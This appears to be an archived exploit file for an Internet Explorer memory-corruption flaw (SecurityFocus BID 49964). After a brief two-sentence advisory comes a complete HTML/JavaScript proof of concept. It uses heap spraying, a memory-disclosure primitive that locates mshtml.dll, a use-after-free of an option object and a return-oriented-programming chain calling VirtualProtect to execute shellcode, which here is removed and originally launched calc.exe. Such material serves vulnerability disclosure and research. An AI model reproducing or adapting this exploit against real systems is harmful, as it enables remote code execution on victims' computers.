@@ -1,0 +1,283 @@
+source: http://www.securityfocus.com/bid/49964/info
+
+Microsoft Internet Explorer is prone to a remote memory-corruption vulnerability.
+
+Successful exploits will allow an attacker to run arbitrary code in the context of the user running the application. Failed attacks may cause denial-of-service conditions. 
+
+<html>
+<head>
+</head>
+
+<body>
+
+
+<script type="text/javascript">
+<!--
+
+//originally, windows 7 compatible calc.exe shellcode from SkyLined
+var scode = "removed";
+
+var newstack,newstackaddr;
+var fakeobj;
+
+var spray,spray2,selarray,readindex,readaddr,optarryaddr;
+var elms = new Array();
+
+var optarray;
+
+var mshtmlbase;
+
+//option object that is to be corrupted
+var corruptedoption;
+var corruptedoptionaddr;
+var corruptaddr;
+
+function strtoint(str) {
+    return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);
+}
+
+function inttostr(num) {
+    return String.fromCharCode(num%65536,Math.floor(num/65536));
+}
+
+function crash() {
+    var o = new Option();
+    selarray[99].options.add(o,-0x20000000);
+}
+
+function readmem(addr) {
+    if(addr < readaddr) alert("Error, can't read that address");
+    return strtoint(spray[readindex].substr((addr-readaddr)/2,2));
+}
+
+function readmem2(addr,size) {
+    if(addr < readaddr) alert("Error, can't read that address");
+    return spray[readindex].substr((addr-readaddr)/2,size/2);
+}
+
+function overwrite(addr) {
+    try {
+        var index = (addr-optarryaddr)/4 - 0x40000000;
+        selarray[99].options.add(optarray.pop(),index);
+    } catch(err) {}   
+}
+
+function getreadaddr() {
+    readaddr = 0;
+    var indexarray = new Array();
+    var tmpaddr = 0;
+    var i,index;
+    
+    index = readmem(tmpaddr);
+    indexarray.push(index);
+    
+    while(1) {
+        tmpaddr += 0x100000;
+        index = readmem(tmpaddr);
+        for(i=0;i<indexarray.length;i++) {
+            if(indexarray[i]==index+1) {
+                readaddr = readmem(tmpaddr-0x24)-i*0x100000+0x24;
+                return 1;
+            } else if(indexarray[i]==index-1) {
+                readaddr = readmem(tmpaddr-0x20)-i*0x100000+0x24;
+                return 1;               
+            }
+        }
+        indexarray.push(index);
+    }
+}
+
+//leverages the vulnerability into memory disclosure
+function initread() {
+    //overwrite something in a heap spray slide
+    try {
+        selarray[99].options.add(optarray.pop(),-100000000/4);
+    } catch(err) {}
+    
+    //now find what and where exectly did we overwrite
+    readindex = -1;
+    var i;
+    for(i=1;i<200;i++) {
+        if(spray[0].substring(2,spray[0].length-2)!=spray[i].substring(2,spray[0].length-2))
+{
+            readindex = i;
+            break;
+        }
+    }
+
+    if(readindex == -1) {
+        alert("Error overwriring first spray");
+        return 0;
+    }
+
+    var start=2,len=spray[readindex].length-2,mid;
+    while(len>10) {
+        mid = Math.round(len/2);
+        mid = mid - mid%2;
+        if(spray[readindex].substr(start,mid) !=
+spray[readindex-1].substr(start,mid)) {
+            len = mid;
+        } else {
+            start = start+mid;
+            len = len-mid;
+            //if(spray[readindex].substr(start,mid) ==
+spray[readindex-1].substr(start,mid)) alert("error");
+        }
+    }
+    
+    for(i=start;i<(start+20);i=i+2) {
+        if(spray[readindex].substr(i,2) != spray[readindex-1].substr(i,2)) {
+            break;
+        }
+    }
+    
+    //overwrite the string length
+    try {
+        selarray[99].options.add(optarray.pop(),-100000000/4-i/2-1);
+    } catch(err) {}
+       
+    if(spray[readindex].length == spray[readindex-1].length) alert("error
+overwriting string length");
+    
+    //readaddr = strtoint(spray[readindex].substr((0x100000-4-0x20+4)/2,2))+0x24;
+    getreadaddr();
+    
+    optarryaddr = readaddr + 100000000 + i*2;
+
+    return 1;   
+}
+
+function trysploit() {
+    //create some helper objects
+    for(var i =0; i < 100; i++) {
+        elms.push(document.createElement('div'));
+    }
+
+    //force the option cache to rebuild itself
+    var tmp1 = selarray[99].options[70].text;
+
+    //overwrite the CTreeNode pointer
+    overwrite(corruptaddr);
+    //read the address of the option object we overwrited with
+    var optadr = readmem(corruptaddr);
+    //delete the option object...
+    selarray[99].options.remove(0);
+    
+    CollectGarbage();
+    
+    //...and allocate some strings in its place
+    for(var i = 0; i < elms.length; i++) {
+        elms[i].className = fakeobj;
+    }
+
+    //verify we overwrote the deleted option object successfully
+    if(readmem(optadr) != strtoint(fakeobj.substr(0,2))) return 0;
+
+    alert("success, calc.exe should start once you close this message box");
+
+    //now do something with the corrupted option object
+    corruptedoption.parentNode.click();
+}
+
+function hs() {
+    
+    //first heap spray, nop slide + shellcode   
+    spray = new Array(200);
+    var pattern = unescape("%u0C0C%u0C0C");
+    while(pattern.length<(0x100000/2)) pattern+=pattern;
+    pattern = pattern.substr(0,0x100000/2-0x100);
+    for(var i=0;i<200;i++) {
+        spray[i] = [inttostr(i)+pattern+scode].join("");
+    }
+
+    //fill small gaps, we wan everything _behind_ our heap spray so that
+we can read it
+    var asmall = new Array(10000);
+    pattern = "aaaa";
+    while(pattern.length<500) pattern+=pattern;
+    for(var i=0;i<10000;i++) {
+        asmall[i]=[pattern+pattern].join("");
+    }
+    
+    //create some select and option elements
+    selarray = new Array(100);
+    for(var i=0;i<100;i++) {
+        selarray[i] = document.createElement("select");
+        for(var j=0;j<100;j++) {
+            var o = new Option("oooooooooooooooooo","ooooooooooooooooooooo");
+            selarray[i].options.add(o,0);
+        }
+    }
+    
+    //create some extra option elements
+    optarray = new Array(10000);
+    for(var i=0;i<10000;i++) {
+        optarray[i] = new Option("oooooooooooooooooo","ooooooooooooooooooooo");
+    }
+    
+    //enable memory disclosure
+    if(initread()==0) return;
+
+    //force the option cache to rebuild itself
+    var tmp1 = selarray[99].options[60].text;
+    
+    //get the address of some option element to be corrupted, also remove
+it from its select element, we don't want anything else messing with
+it
+    corruptedoptionaddr = readmem(optarryaddr+60*4);
+    corruptedoption = selarray[99].options[60];
+    selarray[99].options.remove(60);
+    
+    //get the base address of mshtml.dll based on the vtable address
+inside the option object
+    mshtmlbase = readmem(corruptedoptionaddr)-0xFC0C0;
+    alert("base address of mshtml.dll : " + mshtmlbase.toString(16));
+
+    //we'll overwrite the pointer to the CTreeNode object, compute its address
+    corruptaddr = corruptedoptionaddr+0x14;
+
+    //second heap-spray, this one will act as a stack (we'll exchange
+stack pointer with a pointer into this)
+    spray2 = new Array(200);   
+
+    //some address that is likely to be inside the "stack"
+    newstackaddr = optarryaddr+100000000;
+    newstackaddr-=newstackaddr%0x1000;
+    newstackaddr+=0x24;
+
+    //assemble the "stack" so that it calls VirtualProtect on the firs
+shellcode and then jumps into it through return-oriented-programming
+    newstack = inttostr(newstackaddr+0x10)+unescape("%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA")+inttostr(newstackaddr+0x14)+inttostr(mshtmlbase+0x14EF7)+inttostr(mshtmlbase+0x1348)+inttostr(mshtmlbase+0x801E8)+inttostr(readaddr+0x100000-0x24)+inttostr(0x100000)+inttostr(0x40)+inttostr(readaddr+0x1000)+inttostr(readaddr+0x101000)+unescape("%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA")+inttostr(mshtmlbase+0x1B43F);
+    while(newstack.length<(0x1000/2))
+newstack+=unescape("%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA%uAAAA");
+    newstack = newstack.substr(0,0x1000/2);
+    while(newstack.length<(0x100000/2)) newstack+=newstack;
+    newstack = newstack.substr(0,0x100000/2-0x100);
+    for(var i=0;i<200;i++) {
+        spray2[i] = [newstack].join("");
+    }
+    
+    //constract a fake object which will replace a deleted option object
+(it has to be the same size)
+    //fakeobj = unescape("%u4141%u4141")+inttostr(newstackaddr)+unescape("%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141");
+    fakeobj = unescape("%u4141%u4141%u4141%u4141")+unescape("%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141");
+    
+    //loop until we either achieve command execution or fail
+    for(var i=0;i<100;i++) {
+        trysploit();
+    }
+    
+    alert("Exploit failed, try again");
+
+}
+
+
+hs();
+
+
+-->
+</script>
+
+
+</body>
+</html>
